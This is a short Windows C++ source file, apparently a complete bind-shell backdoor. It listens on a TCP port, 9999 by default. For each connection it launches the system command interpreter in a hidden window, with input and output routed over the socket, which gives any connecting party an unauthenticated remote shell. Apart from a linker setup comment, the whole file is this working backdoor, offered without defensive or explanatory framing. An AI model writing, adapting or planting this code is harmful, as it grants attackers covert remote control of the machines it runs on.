// Dependency: Project->Properties->Configuration Properties->Linker->input->Additional dependencies" then go to the end and type ";ws2_32.lib".

#include "stdafx.h"
#include <Winsock2.h>


int main(int argc, char ** argv)
{
	WSADATA WSAData;
	SOCKADDR_IN sin;
	SOCKET sock;
	WSAStartup(MAKEWORD(2, 0), &WSAData);
	u_short listenPort;

	if (argc == 2) {
		listenPort = atoi(argv[1]);
	}
	else listenPort = 9999;

	sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_port = htons(listenPort);

	bind(sock, (SOCKADDR *)&sin, sizeof(SOCKADDR_IN));
	listen(sock, SOMAXCONN);

	while (true)
	{
		SOCKET tmp = accept(sock, 0, 0);
		STARTUPINFOA si = { 0 };
		PROCESS_INFORMATION pi = { 0 };
		char buff[2010];

		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		si.hStdOutput = (HANDLE)tmp;
		si.hStdError = (HANDLE)tmp;
		si.hStdInput = (HANDLE)tmp;

		GetEnvironmentVariableA("COMSPEC", buff, 2000);

		CreateProcessA(buff, 0, 0, 0, true, CREATE_NEW_CONSOLE, 0, 0, &si, &pi);

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		closesocket(tmp);
	}
	return(0);
}